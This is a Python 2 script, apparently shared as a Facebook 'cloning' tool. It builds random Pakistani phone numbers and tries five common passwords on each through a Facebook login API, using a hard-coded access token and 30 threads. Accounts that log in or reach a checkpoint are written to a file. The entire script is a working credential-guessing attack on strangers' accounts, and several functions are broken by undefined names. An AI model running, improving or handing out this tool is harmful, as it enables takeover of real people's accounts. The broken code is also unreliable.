#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(90000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush() 
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 chandtrick.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
#coding=utf-8

#!/usr/bin/python2

import os 

import sys

import base64

import random

import requests

import platform

#module 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
####Logo####

logo1 = """

╭━╮╭━┳━━━╮╭╮╭╮╭┳━━━┳━━━┳━━┳━━━╮
┃┃╰╯┃┃╭━╮┃┃┃┃┃┃┃╭━╮┃╭━╮┣┫┣┫╭━━╯
┃╭╮╭╮┃╰━╯┃┃┃┃┃┃┃┃╱┃┃╰━━╮┃┃┃╰━━╮
┃┃┃┃┃┃╭╮╭╯┃╰╯╰╯┃╰━╯┣━━╮┃┃┃┃╭━━╯
┃┃┃┃┃┃┃┃╰╮╰╮╭╮╭┫╭━╮┃╰━╯┣┫┣┫┃
╰╯╰╯╰┻╯╰━╯╱╰╯╰╯╰╯╱╰┻━━━┻━━┻╯
 
╔══──────────────────────────╗
║AUTHOR   >>  WASIF.XD
║GITHUB   >>  wasifjani  ║
║WHATSAPP >>  +923179873063  ║
║YOUTUBE  >>   pubg lite║
╚══──────────────────────────╝
🔥 CHAND NOT NAME IT'S BRANDS 🔥
"""
numm = [5,2,5,2,2]
##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;93m[1]\x1b[1;92m SUBSCRIBE MY YOUTUBE CHANNAL"
    time.sleep(0.05)
    print "\033[1;93m[2]\x1b[1;92m EXIT "
    time.sleep(0.05)
    print '\x1b[1;93m[0]\033[1;92m BACK '
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;93m CHOOSE  : \033[1;92m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif peak =="1":
        os.system('xdg-open  https://youtube.com/channel/UCPErGt_PlIcbobfyCwle9HA')
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;92m[1] START CLONING \033[1;93m(No Login)'
    time.sleep(0.10)
    print '\x1b[1;92m[2] EXIT'
    time.sleep(0.10)
    print '\x1b[1;92m[0] BACK'
    time.sleep(0.10)
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;93m CHOOSE:\033[1;92m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo1
        print "\033[1;92mEnter any Pakistan code Number"
        print '\033[1;92mFrom 1 to 49\n'
        try:
            c = raw_input("\033[1;93mCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;93m-'
    xxx = str(len(id))
    jalan ('\033[1;92m Total ids number: '+xxx)
    jalan ('\033[1;92mCode you choose: '+c)
    jalan ("\033[1;92mWait A While Start Cracking...")
    jalan ("\033[1;92mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;93m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError: 
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;32m[XD-OK]  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m[XD-CP] ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + nama + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[XD-OK]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m[XD-CP] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="Pakistan123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[XD-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[XD-CP] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="khan khan"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;32m[XD-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m[XD-CP] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[XD-OK]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[XD-CP] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;97m-'
    print 'Process Has Been Completed ...'
    print 'Total CP/Ok: '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 7 days")
    print ''
    print """
\033[1;97mThanks me later
\033[1;97mFb\033[1;97mWASIF XD"""

    
    raw_input("\n\033[1;97m[\033[1;97mBack\033[1;95m]")
    login() 
          
def Token_token():
	os.system("clear")
	print logo
	print("")
	try:
		tok = open('/sdcard/Download/.qaiser.txt', 'r').read()
		dec = base64.b64decode(tok)
		if len(dec) < 50:
		    not_reg()
		r = requests.get("pastebin.com/raw/Ah0273Lis").text
		if dec in r:
			main() #add your main menu when payment sucess
		else:
		    print('\t  \033[1;91m YOUR  Token_token  IS NOT  APPROVED :(').center(50)
		    print("")
		    print('\033[1;93m Your Token_token : \033[1;92m'+dec+'\n\n\n')
		    raw_input("  \t  \033[1;93m Press enter to check again ")
		    not_reg()
	except (IOError):
	    not_reg()
	except requests.exceptions.ConnectionError:
	    print('\n\n\nTurn on mobile data OR wifi to continue\n\n')
	    sys.exit()

	

def not_reg():
    print('\n\n\nVerify your Token_token\n\n\n')
    string_Token_token = 'abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    v_Token_token = ''.join((random.choice(string_Token_token)) for x in range(50))
    v_Token_token_save = open('/sdcard/Download/.qaiser.txt', 'w')
    v_Token_token_save.write(base64.b64encode(v_Token_token))
    v_Token_token_save.close()
    print('\033[1;93m Your Token_token : \033[1;92m' + v_Token_token)
    print("")
    print("")
    raw_input("  \t  \033[1;93m Press enter to check again ")
    os.system('xdg-open https://wa.me/+923179873063') #whatsapp number here
    Token_token()

          
          
if __name__ == '__main__':
    Token_token()
